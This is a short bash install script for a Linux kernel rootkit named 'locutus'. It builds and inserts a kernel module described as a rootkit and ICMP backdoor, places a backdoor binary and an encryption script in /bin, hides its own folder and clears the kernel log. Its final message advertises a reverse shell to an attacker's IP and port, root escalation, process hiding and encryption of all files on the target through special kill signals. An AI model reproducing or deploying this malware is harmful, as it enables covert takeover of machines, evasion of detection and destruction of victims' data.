#!/bin/bash
echo "installing locutus..."
mv $(pwd) ../borg_d3monized # add magic prefix to our folder to be hidden

sudo apt install build-essential -y &&# prepare for building

mv locutus borg_locutus && # add magic prefix
cd borg_locutus &&
bash make.sh && # build rk and icmp backdoor
sudo mv borg_transwarp /bin/ &&
sudo mv enc.py /bin/borg_enc &&
sudo chmod +x /bin/borg_enc &&
mv locutus.ko borg_locutus.ko &&
sudo insmod borg_locutus.ko && # insert lkm
dmesg --clear &&# clear log

echo -ne "locutus succesfully installed! \nget a reverse shell by running borg_locutus/trigger.sh <target ip> <attacker ip> <attacker port>\nget root by using kill -64 $$\nhide a process by using kill -63 pid\nencode all files on the target with kill -62 $RANDOM\nThe folder name is now borg_d3monized! \n"
